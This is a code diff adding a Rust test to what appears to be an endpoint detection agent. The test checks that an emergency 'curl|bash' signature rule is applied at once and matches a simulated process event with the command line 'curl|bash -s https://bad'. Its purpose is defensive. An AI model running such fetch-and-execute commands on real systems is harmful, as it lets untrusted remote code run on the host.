@@ -293,6 +293,59 @@ fn sanitize_archive_relative_path_rejects_traversal() {
     );
 }
 
+#[tokio::test]
+// AC-DET-160 AC-DET-163
+async fn emergency_command_is_applied_immediately_in_command_path() {
+    let mut cfg = AgentConfig::default();
+    cfg.offline_buffer_backend = "memory".to_string();
+    cfg.server_addr = "127.0.0.1:1".to_string();
+
+    let mut runtime = AgentRuntime::new(cfg).expect("build runtime");
+    runtime.client.set_online(false);
+
+    let command = grpc_client::CommandEnvelope {
+        command_id: "cmd-emergency-1".to_string(),
+        command_type: "emergency_rule_push".to_string(),
+        payload_json: serde_json::json!({
+            "rule_type": "signature",
+            "rule_name": "cmd-emergency-signature",
+            "rule_content": "curl|bash",
+            "severity": "high"
+        })
+        .to_string(),
+    };
+
+    let started = std::time::Instant::now();
+    runtime.handle_command(command, 123).await;
+    assert!(started.elapsed() < std::time::Duration::from_secs(1));
+
+    let event = detection::TelemetryEvent {
+        ts_unix: 124,
+        event_class: detection::EventClass::ProcessExec,
+        pid: 4242,
+        ppid: 1,
+        uid: 1000,
+        process: "bash".to_string(),
+        parent_process: "sshd".to_string(),
+        file_path: None,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some("curl|bash -s https://bad".to_string()),
+    };
+
+    let out = runtime
+        .detection_state
+        .process_event(&event)
+        .expect("evaluate event");
+    assert!(out
+        .layer1
+        .matched_signatures
+        .iter()
+        .any(|sig| sig == "curl|bash"));
+}
+
 fn to_hex(raw: &[u8]) -> String {
     raw.iter().map(|b| format!("{:02x}", b)).collect::<String>()
 }
